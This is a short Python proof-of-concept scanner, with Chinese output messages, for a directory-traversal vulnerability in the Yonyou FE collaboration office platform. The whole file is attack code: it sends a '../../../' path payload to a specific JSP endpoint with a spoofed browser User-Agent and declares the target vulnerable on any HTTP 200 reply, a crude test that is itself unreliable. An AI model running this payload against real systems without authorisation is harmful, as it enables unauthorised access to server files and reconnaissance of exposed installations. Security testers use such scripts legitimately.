import time
import requests
import re
import sys
from urllib.parse import quote
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    console.print(now_time() +  ' [INFO]     正在检测用友 FE协作办公平台目录遍历漏洞',style='bold blue')
    url = target_url + '/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers)
        if response.status_code == 200:
            console.print(now_time() +  " [SUCCESS]  该系统可能存在目录遍历漏洞，具体URL为:{}".format(url),style='bold green')
        else:
            console.print(now_time() +  ' [WARNING]  FE协作办公平台目录遍历漏洞不存在', style='bold red')
    except:
        console.print(now_time() +  ' [WARNING]  无法该目标无法建立连接', style='bold red')
        
        
